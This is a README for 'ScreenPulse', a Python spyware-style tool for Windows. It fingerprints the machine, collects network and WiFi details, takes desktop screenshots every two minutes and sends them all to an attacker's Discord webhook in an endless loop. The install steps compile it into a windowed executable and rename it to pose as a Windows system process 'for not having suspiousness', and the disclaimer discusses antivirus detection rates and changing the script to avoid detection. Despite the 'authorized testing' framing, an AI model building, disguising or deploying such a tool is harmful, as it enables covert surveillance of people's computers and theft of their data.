# 🔥 **ScreenPulse -- Windows Recon & Screenshot Dropper**

[![Version](https://img.shields.io/badge/version-1.0-blue.svg)]()
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

**ScreenPulse** is a Windows exclusive recon operator that sweeps the
system, fingerprints the machine, **snaps a desktop screenshot every 2
minutes, and ships everything straight to your webhook without getting
Discord rate-limited or banned.**

Clean. Silent. Automated.\
Built for red team **simulations** and **cyber research.**

## 🧩 **What ScreenPulse Does**

-   Collects system fingerprints\
-   Gathers network info\
-   Captures a **full desktop screenshot**\
-   Sends everything to your webhook every **120 seconds**\
-   Loops forever\
-   Stays under Discord's radar (no rate-limit spam)\
-   Random embed colors for dynamic logs\
-   Auto retry until internet is available

## 🛰️ **Tech Stack**

-   Python\
-   Requests\
-   PyAutoGUI\
-   Psutil\
-   Discord Webhooks

Built specifically for **Windows environments**.

## ⚡ **Features**

| Feature                     | Details                                                     |
|----------------------------|-------------------------------------------------------------|
| System Recon               | Username, hostname, OS, architecture, CPU                   |
| System Stats               | RAM, disk usage, uptime, active sessions                    |
| Battery Data               | Battery %, charge state                                     |
| Network                    | Private IP + Public IP via ipify                            |
| WiFi Info                  | SSID via netsh (Windows only)                               |
| Hardware Fingerprints      | MAC address                                                 |
| Screenshot Capture         | Full desktop PNG every 2 minutes                            |
| Random Embed Colors        | Looks cleaner in Discord                                    |
| Auto Loop                  | Sends data forever                                          |

## 🔥 **Webhook Preview (Discord Embed)**

``` json
{
  "title": "💻 Computer Started!",
  "description": "System Monitor Online!",
  "color": 3066993,
  "fields": [
    { "name": "User", "value": "Nuknov" },
    { "name": "Host", "value": "DESKTOP-1337" },
    { "name": "Public IP", "value": "xxx.xxx.xxx" }
  ],
  "image": { "url": "attachment://startup_screenshot.png" }
}
```

# 🛠️ Installation

## Install Python modules:

    pip install -r requirements.txt
    
    pyinstaller --onefile --windowed --icon=pic.png screenpulse.py

    Go to dist folder then run the .exe file, you can also rename the exe file like: Host Process for Windows Task (for not having suspiousness).

# ⚙️ Configuration

Inside the script:

    WEBHOOK_URL = "YOUR_WEBHOOK_HERE"

Paste your Discord webhook.

# ▶️ Run ScreenPulse

    python screenpulse.py

Runs forever --- sends a full recon packet every **120 seconds**.

To change delay:

    if __name__ == "__main__":
      while True:
        send_startup_message()
        time.sleep(120) # 2 min == 120 (Modify your minutes according to your need.)


## ⚠️ Disclaimer

>This project is provided for **educational** and **authorized testing** purposes only.  
>You must have **explicit permission** from the system owner before using this tool.
>
>The author is **not responsible** for any misuse or damage caused by this program.
>
>**Detection Note:**  
>- Current detection probability is around **50/50**.  
>- **Kaspersky** is known to detect this tool at the moment.  
>- It is recommended to **modify the script** to match your operational needs.
>
>Use responsibly.


## Team Idea:

* [AnonKryptiQuz](https://github.com/AnonKryptiQuz)
* [0nsec](https://github.com/0nsec)


## **Author**

**Created by:** [Nuknov](https://github.com/Nuknov)


